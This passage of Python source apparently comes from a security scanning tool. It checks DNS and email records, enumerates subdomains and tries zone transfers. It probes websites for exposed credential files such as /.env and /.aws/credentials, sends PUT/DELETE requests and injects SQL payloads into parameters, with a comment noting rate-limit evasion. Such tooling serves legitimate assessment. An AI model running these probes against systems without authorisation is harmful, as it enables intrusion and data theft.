                        "N/A - DNSSEC is properly configured",
                        "Network"
                    )
                    self.report.add_finding(finding)
                    return
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                pass
            
            # Query for DS record (delegation signer)
            try:
                ds_answers = dns.resolver.resolve(self.target, 'DS', raise_on_no_answer=False)
                if ds_answers and len(ds_answers) > 0:
                    print(f"{SUCCESS} DNSSEC DS records found")
                    return
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                pass
            
            # No DNSSEC found
            print(f"{WARNING} DNSSEC is NOT enabled for {self.target}")
            finding = Finding(
                "DNSSEC Not Enabled",
                f"DNSSEC is not configured for {self.target}. Without DNSSEC, "
                f"DNS responses can be spoofed or tampered with in transit, "
                f"enabling cache poisoning and man-in-the-middle attacks.",
                RiskRating.LOW,
                "1. Enable DNSSEC at your DNS registrar/provider.\n"
                "    2. Sign your DNS zone with DNSSEC keys.\n"
                "    3. Publish DS records to the parent zone.",
                "Network"
            )
            self.report.add_finding(finding)
            
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} DNSSEC check failed: {str(e)}")
    
    def check_email_security(self):
        """Check SPF, DKIM, and DMARC DNS records for email security"""
        print(f"\n{INFO} Checking Email Security (SPF/DKIM/DMARC)")
        
        domain = self.target
        
        # --- SPF Check ---
        try:
            txt_records = dns.resolver.resolve(domain, 'TXT')
            spf_found = False
            spf_record = ""
            
            for record in txt_records:
                record_text = str(record).strip('"')
                if record_text.startswith('v=spf1'):
                    spf_found = True
                    spf_record = record_text
                    print(f"{SUCCESS} SPF Record: {record_text[:100]}")
                    
                    # Check for overly permissive SPF
                    if '+all' in record_text:
                        print(f"{CRITICAL} SPF record uses +all (allows ANY server to send email)")
                        finding = Finding(
                            "SPF Record Overly Permissive (+all)",
                            f"SPF record uses '+all' which permits any mail server to send email "
                            f"on behalf of {domain}. This completely defeats SPF protection.",
                            RiskRating.HIGH,
                            "Change +all to -all (hard fail) or ~all (soft fail) in the SPF record.",
                            "Network"
                        )
                        finding.add_evidence(f"SPF: {record_text}")
                        self.report.add_finding(finding)
                    elif '~all' in record_text:
                        print(f"{INFO} SPF uses ~all (softfail) — consider using -all")
                    elif '-all' in record_text:
                        print(f"{SUCCESS} SPF uses -all (hardfail) — good")
                    break
            
            if not spf_found:
                print(f"{WARNING} No SPF record found for {domain}")
                finding = Finding(
                    "Missing SPF Record",
                    f"No SPF (Sender Policy Framework) record found for {domain}. "
                    f"Without SPF, anyone can send emails impersonating your domain.",
                    RiskRating.MEDIUM,
                    "1. Create a TXT record with 'v=spf1' followed by authorized mail servers.\n"
                    "    2. End the record with '-all' to reject unauthorized senders.",
                    "Network"
                )
                self.report.add_finding(finding)
                
        except dns.resolver.NoAnswer:
            print(f"{WARNING} No TXT records found for {domain}")
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} SPF check failed: {str(e)}")
        
        # --- DMARC Check ---
        try:
            dmarc_domain = f"_dmarc.{domain}"
            dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
            dmarc_found = False
            
            for record in dmarc_records:
                record_text = str(record).strip('"')
                if 'v=DMARC1' in record_text or 'v=dmarc1' in record_text.lower():
                    dmarc_found = True
                    print(f"{SUCCESS} DMARC Record: {record_text[:100]}")
                    
                    # Check DMARC policy
                    if 'p=none' in record_text.lower():
                        print(f"{WARNING} DMARC policy is 'none' (monitoring only, no enforcement)")
                        finding = Finding(
                            "DMARC Policy Set to None",
                            f"DMARC policy for {domain} is set to 'none', meaning failed emails "
                            f"are still delivered. This provides monitoring but no protection.",
                            RiskRating.LOW,
                            "Upgrade DMARC policy from 'p=none' to 'p=quarantine' or 'p=reject'.",
                            "Network"
                        )
                        finding.add_evidence(f"DMARC: {record_text}")
                        self.report.add_finding(finding)
                    elif 'p=reject' in record_text.lower():
                        print(f"{SUCCESS} DMARC policy is 'reject' (strong protection)")
                    elif 'p=quarantine' in record_text.lower():
                        print(f"{SUCCESS} DMARC policy is 'quarantine' (good protection)")
                    break
            
            if not dmarc_found:
                print(f"{WARNING} No DMARC record found")
                finding = Finding(
                    "Missing DMARC Record",
                    f"No DMARC record found for {domain}. Without DMARC, "
                    f"there is no policy to handle emails that fail SPF/DKIM checks, "
                    f"making email spoofing significantly easier.",
                    RiskRating.MEDIUM,
                    "1. Create a TXT record at _dmarc.{domain}.\n"
                    "    2. Start with 'v=DMARC1; p=none; rua=mailto:dmarc@{domain}'.\n"
                    "    3. Gradually move to p=quarantine then p=reject.",
                    "Network"
                )
                self.report.add_finding(finding)
                
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            print(f"{WARNING} No DMARC record found for {domain}")
            finding = Finding(
                "Missing DMARC Record",
                f"No DMARC record found for {domain}.",
                RiskRating.MEDIUM,
                "Configure a DMARC TXT record at _dmarc.{domain}.",
                "Network"
            )
            self.report.add_finding(finding)
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} DMARC check failed: {str(e)}")
        
        # --- DKIM Check ---
        # DKIM selectors are not standardized, try common ones
        common_selectors = ['default', 'google', 'selector1', 'selector2', 'k1', 'mail', 'dkim', 's1', 's2', 'email']
        dkim_found = False
        
        for selector in common_selectors:
            try:
                dkim_domain = f"{selector}._domainkey.{domain}"
                dkim_records = dns.resolver.resolve(dkim_domain, 'TXT')
                
                for record in dkim_records:
                    record_text = str(record).strip('"')
                    if 'v=DKIM1' in record_text or 'p=' in record_text:
                        dkim_found = True
                        print(f"{SUCCESS} DKIM Record found (selector: {selector})")
                        if self.verbose:
                            print(f"    {record_text[:100]}")
                        break
                        
                if dkim_found:
                    break
                    
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                continue
            except Exception:
                continue
        
        if not dkim_found:
            print(f"{WARNING} No DKIM records found (checked {len(common_selectors)} common selectors)")
            finding = Finding(
                "DKIM Not Found",
                f"No DKIM (DomainKeys Identified Mail) records found for {domain} "
                f"using common selectors. DKIM cryptographically signs emails to prevent tampering.",
                RiskRating.LOW,
                "1. Configure DKIM signing on your mail server.\n"
                "    2. Publish the DKIM public key as a TXT record at selector._domainkey.{domain}.\n"
                "    3. Common selectors: 'default', 'google', 'selector1'.",
                "Network"
            )
            self.report.add_finding(finding)

# ==================== PHASE 2: SUBDOMAIN SCAN ====================
class SubdomainScanner:
    """Phase 2: Subdomain enumeration and DNS analysis"""
    
    def __init__(self, domain, report, verbose=False):
        self.domain = re.sub(r'^https?://', '', domain).split('/')[0]
        self.report = report
        self.verbose = verbose
        self.subdomains = []
        self.resolved_ips = defaultdict(list)
        self.takeover_vulnerable = []
        
    def run(self):
        """Execute all subdomain scan phases"""
        print(f"\n{INFO} Starting Phase 2: Subdomain Scan on {self.domain}")
        
        # DNS Record Enumeration
        self.dns_enumeration()
        
        # Zone Transfer Check
        self.check_zone_transfer()
        
        # Subdomain Bruteforce
        self.subdomain_bruteforce()
        
        # Certificate Transparency Logs
        self.certificate_transparency()
        
        # ASN & IP Range Discovery
        self.asn_discovery()
        
        # Subdomain Takeover Detection
        self.check_takeover()
        
        # Virtual Host Discovery
        self.vhost_discovery()
        
        print(f"{SUCCESS} Phase 2 completed")
    
    def dns_enumeration(self):
        """Enumerate all DNS record types"""
        print(f"\n{INFO} DNS Record Enumeration")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type, raise_on_no_answer=False)
                if answers:
                    print(f"{SUCCESS} {record_type} Records:")
                    for rdata in answers:
                        print(f"  {rdata}")
                        
                        # Add to report
                        finding = Finding(
                            f"DNS {record_type} Record Found",
                            f"DNS {record_type} record: {rdata}",
                            RiskRating.INFO,
                            "N/A - This is informational",
                            "Subdomain"
                        )
                        self.report.add_finding(finding)
            except dns.resolver.NoAnswer:
                if self.verbose:
                    print(f"{INFO} No {record_type} records found")
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} Error querying {record_type}: {str(e)}")
    
    def check_zone_transfer(self):
        """Check for zone transfer vulnerability (AXFR)"""
        print(f"\n{INFO} Checking for Zone Transfer Vulnerability")
        
        try:
            # Get nameservers
            ns_answers = dns.resolver.resolve(self.domain, 'NS')
            
            for ns in ns_answers:
                ns_name = str(ns).rstrip('.')
                try:
                    ns_ip = socket.gethostbyname(ns_name)
                    
                    # Attempt zone transfer
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, self.domain, timeout=5))
                    
                    if zone:
                        print(f"{CRITICAL} Zone transfer successful from {ns_name} ({ns_ip})!")
                        
                        # Extract records
                        records = []
                        for name, node in zone.nodes.items():
                            rdataset = node.rdatasets
                            records.append(f"{name} {rdataset}")
                        
                        finding = Finding(
                            "DNS Zone Transfer Vulnerable",
                            f"Zone transfer (AXFR) is allowed from nameserver {ns_name}",
                            RiskRating.HIGH,
                            "Restrict zone transfers to authorized servers only. Disable AXFR for external networks.",
                            "Subdomain"
                        )
                        finding.add_evidence(f"Retrieved {len(records)} DNS records")
                        self.report.add_finding(finding)
                        
                except Exception as e:
                    if self.verbose:
                        print(f"{INFO} Zone transfer failed from {ns_name}: {str(e)}")
                        
        except Exception as e:
            print(f"{WARNING} Zone transfer check failed: {str(e)}")
    
    def subdomain_bruteforce(self):
        """Bruteforce subdomains using wordlist"""
        print(f"\n{INFO} Subdomain Bruteforce")
        
        total = len(SUBDOMAINS_WORDLIST)
        progress = ProgressIndicator(total, "Bruteforcing subdomains")
        
        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{self.domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                progress.update()
                return subdomain, ip, full_domain
            except:
                progress.update()
                return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in SUBDOMAINS_WORDLIST]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomain, ip, full_domain = result
                    self.subdomains.append(full_domain)
                    self.resolved_ips[full_domain].append(ip)
                    print(f"\n{SUCCESS} Found: {full_domain} -> {ip}")
        
        print()  # New line after progress
        
        if self.subdomains:
            finding = Finding(
                "Subdomains Discovered",
                f"Found {len(self.subdomains)} subdomains through brute-forcing",
                RiskRating.INFO,
                "Review discovered subdomains and ensure they are properly secured",
                "Subdomain"
            )
            for sub in self.subdomains[:10]:  # Add first 10 as evidence
                finding.add_evidence(sub)
            self.report.add_finding(finding)
    
    def certificate_transparency(self):
        """Query crt.sh for certificate transparency logs"""
        print(f"\n{INFO} Querying Certificate Transparency Logs")
        
        try:
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            response = requests.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                cert_subdomains = set()
                
                for entry in data[:50]:  # Limit to 50 entries
                    name = entry.get('name_value', '')
                    if name:
                        for sub in name.split('\n'):
                            if sub and sub.endswith(self.domain):
                                cert_subdomains.add(sub.lower())
                
                if cert_subdomains:
                    print(f"{SUCCESS} Found {len(cert_subdomains)} subdomains in certificate logs:")
                    for sub in list(cert_subdomains)[:10]:  # Show first 10
                        print(f"  {sub}")
                    
                    # Add new subdomains to our list
                    new_subs = [s for s in cert_subdomains if s not in self.subdomains]
                    self.subdomains.extend(new_subs)
                    
                    finding = Finding(
                        "Certificate Transparency Subdomains",
                        f"Found {len(cert_subdomains)} subdomains from SSL certificate logs",
                        RiskRating.INFO,
                        "Regularly monitor certificate logs for unauthorized certificate issuance",
                        "Subdomain"
                    )
                    self.report.add_finding(finding)
                    
        except Exception as e:
            print(f"{WARNING} Certificate transparency query failed: {str(e)}")
    
    def asn_discovery(self):
        """Discover ASN and associated IP ranges"""
        print(f"\n{INFO} ASN & IP Range Discovery")
        
        try:
            # Get IP of domain
            ip = socket.gethostbyname(self.domain)
            
            # Query for ASN information
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    as_info = data.get('as', '')
                    print(f"{SUCCESS} ASN Information: {as_info}")
                    
                    if as_info:
                        asn = as_info.split()[0]  # Extract AS number
                        finding = Finding(
                            "ASN Information Discovered",
                            f"Target is hosted on {as_info}",
                            RiskRating.INFO,
                            "N/A - This is informational",
                            "Subdomain"
                        )
                        self.report.add_finding(finding)
                        
        except Exception as e:
            print(f"{WARNING} ASN discovery failed: {str(e)}")
    
    def check_takeover(self):
        """Check for subdomain takeover vulnerabilities"""
        print(f"\n{INFO} Checking for Subdomain Takeover Vulnerabilities")
        
        takeover_services = {
            'github.io': 'GitHub Pages',
            'herokuapp.com': 'Heroku',
            'amazonaws.com': 'AWS S3',
            'cloudfront.net': 'CloudFront',
            'azurewebsites.net': 'Azure',
            'trafficmanager.net': 'Azure Traffic Manager',
            'pantheonsite.io': 'Pantheon',
            'wordpress.com': 'WordPress.com',
            'unbouncepages.com': 'Unbounce',
            'surge.sh': 'Surge',
            'helpjuice.com': 'Helpjuice',
            'helpscoutdocs.com': 'Help Scout',
            'ghost.io': 'Ghost',
            'statuspage.io': 'StatusPage',
            'readme.io': 'Readme.io'
        }
        
        for subdomain in self.subdomains:
            try:
                # Check for CNAME records pointing to external services
                answers = dns.resolver.resolve(subdomain, 'CNAME')
                for cname in answers:
                    cname_str = str(cname).lower()
                    
                    for service_domain, service_name in takeover_services.items():
                        if service_domain in cname_str:
                            # Verify if service is actually claimed
                            try:
                                requests.get(f"http://{subdomain}", timeout=5, verify=False)
                                # Service responds - might be claimed
                                if self.verbose:
                                    print(f"{INFO} {subdomain} -> {service_name} (responds)")
                            except:
                                # Service doesn't respond - potential takeover
                                print(f"{CRITICAL} {subdomain} -> {service_name} (POTENTIAL TAKEOVER!)")
                                self.takeover_vulnerable.append({
                                    'subdomain': subdomain,
                                    'service': service_name,
                                    'cname': cname_str
                                })
                                
                                finding = Finding(
                                    "Subdomain Takeover Possible",
                                    f"{subdomain} has CNAME to {service_name} but service appears unclaimed",
                                    RiskRating.HIGH,
                                    f"Claim the service or remove the DNS record pointing to {service_name}",
                                    "Subdomain"
                                )
                                self.report.add_finding(finding)
                                
            except dns.resolver.NoAnswer:
                pass
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} Error checking {subdomain}: {str(e)}")
    
    def vhost_discovery(self):
        """Discover virtual hosts by sending Host header mutations"""
        print(f"\n{INFO} Virtual Host Discovery")
        
        try:
            # Try to discover IP of main domain
            ip = socket.gethostbyname(self.domain)
            
            # Common Host header mutations
            mutations = [
                self.domain,
                f"www.{self.domain}",
                f"admin.{self.domain}",
                f"dev.{self.domain}",
                f"test.{self.domain}",
                "localhost",
                ip,
                "127.0.0.1",
                "admin",
                "mail",
                "ftp"
            ]
            
            for mutation in mutations:
                try:
                    headers = {'Host': mutation}
                    response = requests.get(f"http://{ip}", headers=headers, timeout=5, verify=False)
                    
                    if response.status_code < 400:  # Valid response
                        if mutation != self.domain:
                            print(f"{SUCCESS} Potential vhost: {mutation} -> {response.status_code}")
                            
                            finding = Finding(
                                "Virtual Host Discovered",
                                f"Virtual host '{mutation}' resolves to {ip}",
                                RiskRating.INFO,
                                "Ensure all virtual hosts are properly configured and secured",
                                "Subdomain"
                            )
                            self.report.add_finding(finding)
                            
                except:
                    pass
                    
        except Exception as e:
            print(f"{WARNING} Virtual host discovery failed: {str(e)}")

# ==================== PHASE 3: WEB APPLICATION SCAN ====================
class WebScanner:
    """Phase 3: Web application security scanning"""
    
    def __init__(self, target, report, verbose=False):
        self.target = target if target.startswith(('http://', 'https://')) else f"http://{target}"
        self.report = report
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.forms = []
        self.links = []
        self.cookies = {}
        self.headers = {}
        self.tech_stack = []
        
        import random
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        self.session.headers.update({"User-Agent": random.choice(user_agents)})
        self.error_baseline = ""
        
    def run(self):
        """Execute all web application scan phases"""
        print(f"\n{INFO} Starting Phase 3: Web Application Scan on {self.target}")
        
        # Information Gathering
        self.information_gathering()
        
        # OWASP A01: Broken Access Control
        self.check_access_control()
        
        # OWASP A02: Cryptographic Failures
        self.check_crypto_failures()
        
        # OWASP A03: Injection
        self.check_injection()
        
        # OWASP A04: Insecure Design
        self.check_insecure_design()
        
        # OWASP A05: Security Misconfiguration
        self.check_misconfiguration()
        
        # OWASP A06: Vulnerable Components
        self.check_vulnerable_components()
        
        # OWASP A07: Authentication Failures
        self.check_auth_failures()
        
        # OWASP A08: Integrity Failures
        self.check_integrity_failures()
        
        # OWASP A09: Logging Failures
        self.check_logging_failures()
        
        # OWASP A10: SSRF
        self.check_ssrf()
        
        # Additional Checks
        self.additional_checks()
        
        # Advanced Injection Checks
        self.check_host_header_injection()
        self.check_crlf_injection()
        self.check_http_request_smuggling()
        self.check_cache_poisoning()
        self.check_websocket_endpoints()
        
        print(f"{SUCCESS} Phase 3 completed")
    
    def information_gathering(self):
        """Gather information about the web application"""
        print(f"\n{INFO} Information Gathering")
        
        try:
            # Baseline test for Soft-404 false positive prevention
            self.error_baseline = self.session.get(urljoin(self.target, f'/this-page-does-not-exist-{int(time.time())}.html'), timeout=5).text.lower()
        except:
            self.error_baseline = ""
            
        try:
            # Initial request
            response = self.session.get(self.target)
            self.headers = dict(response.headers)
            
            print(f"{SUCCESS} Target responds with status code: {response.status_code}")
            if response.status_code in [403, 406] and ('cloudflare' in response.text.lower() or 'akamai' in response.text.lower()):
                print(f"{WARNING} WAF Detected via Initial Request! Results may be limited or blocked.")
            
            # Detect CMS and Technology Stack
            self.detect_cms(response)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            self.forms = soup.find_all('form')
            print(f"{INFO} Found {len(self.forms)} forms")
            if self.forms:
                for i, form in enumerate(self.forms, 1):
                    action_val = form.get('action', 'Self/Empty')
                    id_val = form.get('id', 'No ID')
                    print(f"    --> [{i}] Action: {action_val} | ID: {id_val}")
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http'):
                    self.links.append(href)
                elif href.startswith('/'):
                    self.links.append(urljoin(self.target, href))
            print(f"{INFO} Found {len(self.links)} unique links")
            
            # Check robots.txt
            self.check_robots()
            
            # Check sensitive files
            self.check_sensitive_files()
            
            # HTTP Headers analysis
            self.analyze_headers()
            
        except Exception as e:
            print(f"{WARNING} Information gathering failed: {str(e)}")
    
    def detect_cms(self, response):
        """Detect CMS and technology stack"""
        content = response.text.lower()
        headers = response.headers
        
        cms_signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Joomla': ['joomla', 'com_content', 'com_users'],
            'Drupal': ['drupal', 'sites/all', 'core/misc'],
            'Magento': ['magento', 'skin/frontend', 'js/varien'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'Wix': ['wix.com', 'wixstatic.com'],
            'Squarespace': ['squarespace.com', 'static.squarespace'],
            'Ghost': ['ghost', 'ghost.org']
        }
        
        for cms, signatures in cms_signatures.items():
            for sig in signatures:
                if sig in content:
                    print(f"{SUCCESS} CMS Detected: {cms}")
                    self.tech_stack.append(cms)
                    
                    finding = Finding(
                        f"CMS Detected: {cms}",
                        f"The website appears to be running {cms}",
                        RiskRating.INFO,
                        "N/A - This is informational",
                        "Web"
                    )
                    self.report.add_finding(finding)
                    break
        
        # Detect server technology
        server = headers.get('Server', '')
        if server:
            print(f"{INFO} Server: {server}")
            self.tech_stack.append(server)
            
        # Detect programming language
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            print(f"{INFO} Powered By: {powered_by}")
            self.tech_stack.append(powered_by)
    
    def check_robots(self):
        """Check robots.txt for sensitive paths"""
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            response = self.session.get(robots_url)
            
            if response.status_code == 200:
                print(f"{WARNING} robots.txt found:")
                disallowed = []
                for line in response.text.split('\n'):
                    if line.lower().startswith('disallow'):
                        disallowed.append(line)
                        print(f"  {line}")
                
                if disallowed:
                    finding = Finding(
                        "Robots.txt Exposes Sensitive Paths",
                        "robots.txt contains Disallow directives that may reveal sensitive areas",
                        RiskRating.MEDIUM,
                        "Review robots.txt to ensure it doesn't expose sensitive information",
                        "Web"
                    )
                    for path in disallowed[:5]:
                        finding.add_evidence(path)
                    self.report.add_finding(finding)
                    
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} Could not check robots.txt: {str(e)}")
    
    def check_sensitive_files(self):
        """Check for exposed sensitive files"""
        sensitive_files = [
            '/.git/config', '/.env', '/.aws/credentials', 
            '/composer.json', '/package.json', '/requirements.txt',
            '/wp-config.php.bak', '/config.php.bak', '/.htaccess',
            '/.svn/entries', '/.DS_Store', '/crossdomain.xml',
            '/clientaccesspolicy.xml', '/phpinfo.php', '/info.php',
            '/.gitignore', '/.dockerignore', '/docker-compose.yml',
            '/.npmrc', '/.yarnrc', '/.bowerrc', '/Gemfile',
            '/Gemfile.lock', '/go.mod', '/build.gradle', '/pom.xml'
        ]
        
        for file_path in sensitive_files:
            try:
                time.sleep(0.1)  # Simple rate limit evasion
                url = urljoin(self.target, file_path)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if content_lower and content_lower != self.error_baseline:
                        # Validate the content against basic signatures
                        is_valid = False
                        if 'git' in file_path and '[core]' in content_lower: is_valid = True
                        elif 'env' in file_path and '=' in content_lower: is_valid = True
                        elif 'json' in file_path and '{' in content_lower: is_valid = True
                        elif 'docker' in file_path and ('from ' in content_lower or 'image:' in content_lower): is_valid = True
                        elif 'xml' in file_path and '<?xml' in content_lower: is_valid = True
                        elif '<html' not in content_lower: is_valid = True
                        
                        if is_valid:
                            print(f"{CRITICAL} Sensitive file exposed: {file_path}")
                            
                            finding = Finding(
                                f"Sensitive File Exposed: {file_path}",
                                f"The file {file_path} is publicly accessible",
                                RiskRating.HIGH,
                                f"Restrict access to {file_path} and remove it from the web root",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            
            except:
                pass
    
    def analyze_headers(self):
        """Analyze HTTP headers for security issues"""
        security_headers = {
            'Strict-Transport-Security': {
                'desc': 'HSTS header missing',
                'risk': RiskRating.MEDIUM,
                'remediation': 'Implement HSTS to enforce HTTPS connections'
            },
            'Content-Security-Policy': {
                'desc': 'CSP header missing',
                'risk': RiskRating.MEDIUM,
                'remediation': 'Implement CSP to mitigate XSS and data injection attacks'
            },
            'X-Content-Type-Options': {
                'desc': 'X-Content-Type-Options header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Set X-Content-Type-Options: nosniff'
            },
            'X-Frame-Options': {
                'desc': 'X-Frame-Options header missing',
                'risk': RiskRating.MEDIUM,
                'remediation': 'Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking'
            },
            'X-XSS-Protection': {
                'desc': 'X-XSS-Protection header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Set X-XSS-Protection: 1; mode=block'
            },
            'Referrer-Policy': {
                'desc': 'Referrer-Policy header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Implement Referrer-Policy header'
            },
            'Permissions-Policy': {
                'desc': 'Permissions-Policy header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Implement Permissions-Policy header'
            }
        }
        
        for header, info in security_headers.items():
            if header not in self.headers:
                print(f"{WARNING} Missing security header: {header}")
                
                finding = Finding(
                    f"Missing Security Header: {header}",
                    info['desc'],
                    info['risk'],
                    info['remediation'],
                    "Web"
                )
                self.report.add_finding(finding)
    
    def check_access_control(self):
        """Check for broken access control issues"""
        print(f"\n{INFO} Checking for Broken Access Control")
        
        # Check for directory listing
        common_dirs = ['/images/', '/css/', '/js/', '/uploads/', '/backup/', '/temp/']
        
        for directory in common_dirs:
            try:
                url = urljoin(self.target, directory)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    # Check if directory listing is enabled
                    if 'Index of' in response.text:
                        print(f"{CRITICAL} Directory listing enabled: {directory} (Status: {response.status_code})")
                        
                        finding = Finding(
                            "Directory Listing Enabled",
                            f"Directory listing is enabled at {directory}",
                            RiskRating.HIGH,
                            "Disable directory listing in web server configuration",
                            "Web"
                        )
                        self.report.add_finding(finding)
            except:
                pass
        
        # Check for admin panels
        for admin_panel in ADMIN_PANELS:
            try:
                time.sleep(0.1)
                url = urljoin(self.target, admin_panel)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if content_lower != self.error_baseline:
                        # Additional validation specifically for an admin panel looking form
                        if '<input' in content_lower and ('password' in content_lower or 'type="password"' in content_lower or 'login' in content_lower):
                            print(f"{WARNING} Admin panel accessible: {admin_panel} (Status: {response.status_code})")
                            
                            finding = Finding(
                                "Admin Panel Exposed",
                                f"Admin panel accessible at {admin_panel}",
                                RiskRating.HIGH,
                                "Restrict access to admin panels by IP or implement additional authentication",
                                "Web"
                            )
                            self.report.add_finding(finding)
            except:
                pass
        
        # Check for HTTP verb tampering
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'OPTIONS', 'PATCH']
        
        for method in dangerous_methods:
            try:
                time.sleep(0.1)
                if method in ['PUT', 'DELETE']:
                    test_url = urljoin(self.target, f'/test-{int(time.time())}.txt')
                    response = self.session.request(method, test_url)
                    if response.status_code in [200, 201, 204]:
                        print(f"{CRITICAL} HTTP method {method} is allowed! (Status: {response.status_code})")
                        finding = Finding(
                            f"Dangerous HTTP Method Allowed: {method}",
                            f"The server allows {method} requests which could lead to security issues via file creation/deletion",
                            RiskRating.HIGH,
                            f"Disable {method} method or restrict its usage",
                            "Web"
                        )
                        self.report.add_finding(finding)
                else:
                    response = self.session.request(method, self.target)
                    
                    if response.status_code not in [405, 501, 403, 404]:  # Method not allowed/not implemented
                        print(f"{CRITICAL} HTTP method {method} is allowed! (Status: {response.status_code})")
                        
                        finding = Finding(
                            f"Dangerous HTTP Method Allowed: {method}",
                            f"The server allows {method} requests which could lead to security issues",
                            RiskRating.HIGH,
                            f"Disable {method} method or restrict its usage",
                            "Web"
                        )
                        self.report.add_finding(finding)
            except:
                pass
    
    def check_crypto_failures(self):
        """Check for cryptographic failures"""
        print(f"\n{INFO} Checking for Cryptographic Failures")
        
        # Check if HTTPS is used
        if not self.target.startswith('https'):
            print(f"{CRITICAL} Website does not use HTTPS")
            
            finding = Finding(
                "HTTPS Not Enforced",
                "The website is accessible over HTTP without HTTPS",
                RiskRating.HIGH,
                "Implement HTTPS and redirect all HTTP traffic to HTTPS",
                "Web"
            )
            self.report.add_finding(finding)
        
        # Check for mixed content
        if self.target.startswith('https'):
            try:
                response = self.session.get(self.target)
                if 'http://' in response.text:
                    print(f"{WARNING} Mixed content detected (HTTP resources on HTTPS page)")
                    
                    finding = Finding(
                        "Mixed Content Detected",
                        "HTTPS page loads resources over HTTP",
                        RiskRating.MEDIUM,
                        "Ensure all resources are loaded over HTTPS",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
        
        # Check SSL/TLS configuration
        try:
            hostname = urlparse(self.target).hostname
            port = 443
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = cert['notAfter']
                    expiry_date = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (expiry_date - datetime.datetime.now()).days
                    
                    if days_until_expiry < 30:
                        print(f"{CRITICAL} SSL certificate expires in {days_until_expiry} days")
                        
                        finding = Finding(
                            "SSL Certificate Expiring Soon",
                            f"Certificate expires in {days_until_expiry} days",
                            RiskRating.HIGH,
                            "Renew the SSL certificate before expiration",
                            "Web"
                        )
                        self.report.add_finding(finding)
                    
                    # Check TLS version
                    tls_version = ssock.version()
                    if tls_version in ['TLSv1', 'TLSv1.1']:
                        print(f"{WARNING} Using outdated TLS version: {tls_version}")
                        
                        finding = Finding(
                            "Outdated TLS Version",
                            f"Server supports {tls_version} which is deprecated",
                            RiskRating.MEDIUM,
                            "Disable TLS 1.0 and 1.1, use TLS 1.2 or 1.3",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} SSL/TLS check failed: {str(e)}")
    
    def check_injection(self):
        """Check for injection vulnerabilities"""
        print(f"\n{INFO} Testing for Injection Vulnerabilities")
        
        # Find all input parameters from forms and URLs
        parameters = set()
        
        # Extract parameters from forms
        for form in self.forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    parameters.add(name)
        
        # Extract parameters from URL
        parsed = urlparse(self.target)
        if parsed.query:
            for param in parse_qs(parsed.query):
                parameters.add(param)
        
        print(f"{INFO} Testing {len(parameters)} parameters for injection")
        
        # SQL Injection testing
        for param in parameters:
            for payload in SQLI_PAYLOADS[:5]:  # Test first 5 payloads for efficiency
                try:
                    # Test GET parameters
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    # Check for SQL errors
                    sql_errors = [
                        "sql", "mysql", "sqlite", "postgresql",
                        "odbc", "driver", "db error",
                        "warning: mysql", "unclosed quotation mark",
                        "you have an error in your sql"
                    ]
                    
                    response_text = response.text.lower()
                    if any(error in response_text for error in sql_errors):
                        print(f"{CRITICAL} Possible SQL Injection in parameter: {param}")
                        
                        finding = Finding(
                            "SQL Injection Vulnerability",
